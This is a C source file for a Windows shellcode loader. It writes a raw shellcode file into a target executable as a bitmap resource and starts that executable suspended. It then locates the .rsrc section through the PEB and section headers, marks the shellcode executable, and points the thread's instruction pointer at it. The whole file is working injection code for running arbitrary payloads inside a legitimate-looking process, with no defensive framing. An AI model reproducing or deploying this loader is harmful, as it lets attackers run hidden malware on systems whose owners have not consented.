#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

#include "main.h"

int wmain(INT argc, WCHAR* argv[])
{
	PWCHAR TargetProcess = NULL;
	WCHAR TargetProcessCopy[FILENAME_MAX];
	PWCHAR ShellcodePath = NULL;
	PCHAR Payload = NULL;

	INT Ret = FALSE;
	SIZE_T cTPLen = 0;
	DWORD PayloadBufferSize = 0;
	DWORD cbRet = 0;
	DWORD dwOldProtect = 0;
	DWORD_PTR AddressShellcodeStart = 0;
	DWORD_PTR PEBOffset = 0;
	DWORD_PTR ImageBase = 0;
	HANDLE hUpdate = NULL;
	NTSTATUS ntStatus = NOERROR;
	SIZE_T cbRead = 0;

	STARTUPINFO sStartInfo = { 0 };
	PROCESS_INFORMATION sProcInfo = { 0 };
	PROCESS_BASIC_INFORMATION sPBI = { 0 };
	IMAGE_DOS_HEADER sImageDOSHeader = { 0 };
	IMAGE_NT_HEADERS64 sImageNTHeader = { 0 };
	IMAGE_SECTION_HEADER sImageSectionHeader = { 0 };
	CONTEXT sCtx = { 0 };


	for (INT i = 1; i < argc; i++)
	{
		if (wcscmp(argv[i], L"-exe") == 0)
		{
			TargetProcess = argv[i + 1];
			i++;
		}
		else if (wcscmp(argv[i], L"-bin") == 0)
		{
			ShellcodePath = argv[i + 1];
			i++;
		}
		else if (wcscmp(argv[i], L"-h") == 0 || wcscmp(argv[i], L"-help") == 0)
		{
			printf("\nUsage: -exe <C:\\Absolute\\Path\\To\\exe> -bin <C:\\Absolute\\Path\\To\\Raw\\Shellcode>\n\n");
			printf("-exe : path to the executable to spawn/inject\n");
			printf("-bin : path to raw shellcode\n");
			exit(0);
		}
	}

	if (!TargetProcess || !ShellcodePath)
	{
		printf("\nUsage: -exe <C:\\Absolute\\Path\\To\\exe> -bin <C:\\Absolute\\Path\\To\\Raw\\Shellcode>\n\n");
		printf("-exe : path to the executable to spawn/inject\n");
		printf("-bin : path to raw shellcode\n");
		exit(1);
	}

	//First create a backup of the TargetProcess file.
	cTPLen = wcslen(TargetProcess);
	wcscpy_s(TargetProcessCopy, FILENAME_MAX, TargetProcess);
	//Replace the '.' with '_' to avoid name collision.
	TargetProcessCopy[(cTPLen)-4] = '_';

	Ret = CopyFile(TargetProcess, TargetProcessCopy, FALSE);
	if (!Ret)
	{
		printf("[!] Failed to make a back up of the target exe. Exiting...\n");
		goto CLEANUP;
	}
	printf("[+] Backup Created: %ls\n", TargetProcessCopy);

	Ret = ReadContents(ShellcodePath, &Payload, &PayloadBufferSize);
	if (!Ret)
	{
		printf("[!] Payload is empty. Exiting...\n");
		goto CLEANUP;
	}

	//Attempt to update the resource of the executable we want to spawn.
	hUpdate = BeginUpdateResource(TargetProcess, TRUE);
	if (!hUpdate)
		goto CLEANUP;

	Ret = UpdateResource(hUpdate, RT_BITMAP, MAKEINTRESOURCE(RT_BITMAP), 0, Payload, PayloadBufferSize);
	if (!Ret)
		goto CLEANUP;

	Ret = EndUpdateResource(hUpdate, FALSE);
	if (!Ret)
		goto CLEANUP;

	printf("[+] Resource Updated: %ls\n", TargetProcess);

	//Spawn the process as suspended
	Ret = CreateProcessW(TargetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sStartInfo, &sProcInfo);
	if (!Ret)
		goto CLEANUP;

	printf("[+] Spawned: %ls\n", TargetProcess);

	//Grab NtQueryInformationProcess
	pfnNtQueryInformationProcess pNtQueryInformationProcess;
	HMODULE hNtDll = LoadLibrary(L"NtDll.dll");
	pNtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtDll, "NtQueryInformationProcess");
	FreeLibrary(hNtDll);

	ntStatus = pNtQueryInformationProcess(sProcInfo.hProcess, ProcessBasicInformation, &sPBI, sizeof(PROCESS_BASIC_INFORMATION), &cbRet);
	if (ntStatus) // 0 = SUCCESS
		goto CLEANUP;

	PEBOffset = (DWORD_PTR)sPBI.PebBaseAddress + 0x10; //x64

	//With the PEB address, get the address of the image base
	Ret = ReadProcessMemory(sProcInfo.hProcess, (LPCVOID)PEBOffset, &ImageBase, 8, NULL);
	if (!Ret)
		goto CLEANUP;

	printf("[+] Image Base: 0x%p\n", (PVOID)ImageBase);

	//From ImageBase, populate a IMAGE_DOS_HEADER to get the e_lfanew
	Ret = ReadProcessMemory(sProcInfo.hProcess, (LPCVOID)ImageBase, &sImageDOSHeader, sizeof(IMAGE_DOS_HEADER), &cbRead);
	if (!Ret)
		goto CLEANUP;

	//Add the imagebase + the value of the e_lfanew to get the start of the IMAGE_NT_HEADERS
	DWORD_PTR AddressImageNTHeader = ((DWORD_PTR)ImageBase + sImageDOSHeader.e_lfanew);
	Ret = ReadProcessMemory(sProcInfo.hProcess, (LPCVOID)AddressImageNTHeader, &sImageNTHeader, sizeof(IMAGE_NT_HEADERS64), &cbRead);
	if (!Ret)
		goto CLEANUP;

	//Moving on to sections, get the address of the first section
	DWORD_PTR AddressOfSection = AddressImageNTHeader + (DWORD_PTR)(sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + sImageNTHeader.FileHeader.SizeOfOptionalHeader);

	// Identify which section is the .rsrc section which should contain the bitmap of our shellcode.
	for (int i = 0; i < sImageNTHeader.FileHeader.NumberOfSections; i++) {

		ReadProcessMemory(sProcInfo.hProcess, (LPCVOID)AddressOfSection, &sImageSectionHeader, sizeof(IMAGE_SECTION_HEADER), &cbRead);
		if (strcmp(sImageSectionHeader.Name, ".rsrc") == 0)
		{
			// We found the .rsrc section, so take the Address of the Image base, add the virtual address of the .rsrc Section, 
			// which gets us to the start of the bitmap. From the start of the bitmap, add another 0x58 to get the start of the shellcode
			AddressShellcodeStart = (DWORD_PTR)ImageBase + (DWORD_PTR)sImageSectionHeader.VirtualAddress + 0x58;

			printf("[+] .rsrc Image Section RVA: 0x%p\n", (PVOID)sImageSectionHeader.VirtualAddress);
			printf("[MATH] ImageBase[0x%p] + .rsrc RVA[0x%p] + BitmapHeader[0x58]\n", (PVOID)ImageBase, (PVOID)sImageSectionHeader.VirtualAddress);
			printf("[+] Shellcode Start: 0x%p\n", (PVOID)AddressShellcodeStart);

			//Ensure protections are PAGE_EXECUTE_READ
			Ret = VirtualProtectEx(sProcInfo.hProcess, (LPVOID)AddressShellcodeStart, PayloadBufferSize, PAGE_EXECUTE_READ, &dwOldProtect);
			if (!Ret)
				goto CLEANUP;

			break;
		}
		//.rsrc wasn't found, move to the start of the next section
		AddressOfSection += sizeof(IMAGE_SECTION_HEADER);
	}

	if (!AddressShellcodeStart)
		goto CLEANUP;

	//Execute the shellcode
	sCtx.ContextFlags = CONTEXT_ALL;
	GetThreadContext(sProcInfo.hThread, &sCtx);
	sCtx.Rip = (DWORD64)AddressShellcodeStart;
	SetThreadContext(sProcInfo.hThread, &sCtx);
	ResumeThread(sProcInfo.hThread);

CLEANUP:
	if (Payload)
	{
		free(Payload);
	}

	if (sProcInfo.hProcess != NULL)
	{
		CloseHandle(sProcInfo.hThread);
		CloseHandle(sProcInfo.hProcess);
	}

	printf("\n[~] Done!");

	return 0;
}

INT ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}